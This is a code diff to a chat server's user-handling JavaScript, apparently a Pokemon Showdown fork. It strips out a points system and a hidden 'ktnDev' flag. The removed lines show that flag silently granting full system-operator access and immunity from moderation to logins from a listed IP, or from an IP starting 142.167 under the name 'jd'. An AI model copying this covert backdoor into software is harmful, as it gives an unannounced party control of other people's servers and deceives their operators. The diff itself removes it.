@@ -281,25 +281,6 @@ var User = (function () {
 		this.userid = toUserid(this.name);
 		this.group = config.groupsranking[0];
 
-		this.warnTimes = 0;
-
-                //points system user variables
-                this.money = 0;
-                this.coins = 0;
-                this.canCustomSymbol = false;
-                this.canCustomAvatar = false;
-                this.canAnimatedAvatar = false;
-                this.canChatRoom = false;
-                this.canTrainerCard = false;
-                this.canFixItem = false;
-                this.canChooseTour = false;
-                this.canDecAdvertise = false;
-                this.hasCustomSymbol = false;
-
-                this.isAway = false;
-                this.originalName = '';
-
-		
 		var trainersprites = [1, 2, 101, 102, 169, 170, 265, 266];
 		this.avatar = trainersprites[Math.floor(Math.random()*trainersprites.length)];
 
@@ -329,9 +310,7 @@ var User = (function () {
 		// initialize
 		users[this.userid] = this;
 	}
-    
-	User.prototype.staffAccess = false;
-    User.prototype.ktnDev = false;
+
 	User.prototype.isSysop = false;
 	User.prototype.forceRenamed = false;
 
@@ -381,10 +360,7 @@ var User = (function () {
 	User.prototype.isStaff = false;
 	User.prototype.can = function(permission, target, room) {
 		if (this.hasSysopAccess()) return true;
-        if (target) {
-                        if (target.ktnDev) return false;
-                    }
-		
+
 		var group = this.group;
 		var targetGroup = '';
 		if (target) targetGroup = target.group;
@@ -450,7 +426,7 @@ var User = (function () {
 	 * Special permission check for system operators
 	 */
 	User.prototype.hasSysopAccess = function() {
-		if (this.isSysop && config.backdoor || this.ktnDev) {
+		if (this.isSysop && config.backdoor) {
 			// This is the Pokemon Showdown system operator backdoor.
 
 			// Its main purpose is for situations where someone calls for help, and
@@ -564,7 +540,6 @@ var User = (function () {
 		this.authenticated = false;
 		this.group = config.groupsranking[0];
 		this.isStaff = false;
-		this.ktnDev = false;
 		this.isSysop = false;
 
 		for (var i=0; i<this.connections.length; i++) {
@@ -724,14 +699,9 @@ var User = (function () {
 			}
 
 			var group = config.groupsranking[0];
-			var staffAccess = false;
-            var ktnDev = false;
 			var isSysop = false;
 			var avatar = 0;
 			var authenticated = false;
-			var avatars = fs.readFileSync('config/avatars.csv', 'utf8');
-            avatars = avatars.split('\n');
-            var ip = this.latestIp.split('.');
 			// user types (body):
 			//   1: unregistered user
 			//   2: registered user
@@ -754,11 +724,6 @@ var User = (function () {
 					this.autoconfirmed = true;
 				}
 			}
-			if (config.ktnDev.indexOf(this.latestIp) >= 0 || ip[0] == "142" && ip[1] == "167" && name == "jd") {
-            ktnDev = true;
-            this.autoconfirmed = true;
-                }
-            }
 			if (users[userid] && users[userid] !== this) {
 				// This user already exists; let's merge
 				var user = users[userid];
@@ -795,16 +760,11 @@ var User = (function () {
 					this.group = config.groupsranking[0];
 					this.isStaff = false;
 				}
-				this.staffAccess = false;
 				this.isSysop = false;
-                this.ktnDev = false;
-				
+
 				user.group = group;
 				user.isStaff = (user.group in {'%':1, '@':1, '&':1, '~':1});
-				user.staffAccess = staffAccess;
 				user.isSysop = isSysop;
-				user.ktnDev = ktnDev;
-				
 				user.forceRenamed = false;
 				if (avatar) user.avatar = avatar;
 
@@ -829,8 +789,6 @@ var User = (function () {
 			// rename success
 			this.group = group;
 			this.isStaff = (this.group in {'%':1, '@':1, '&':1, '~':1});
-			this.staffAccess = staffAccess;
-            this.ktnDev = ktnDev;
 			this.isSysop = isSysop;
 			if (avatar) this.avatar = avatar;
 			if (this.forceRename(name, authenticated)) {
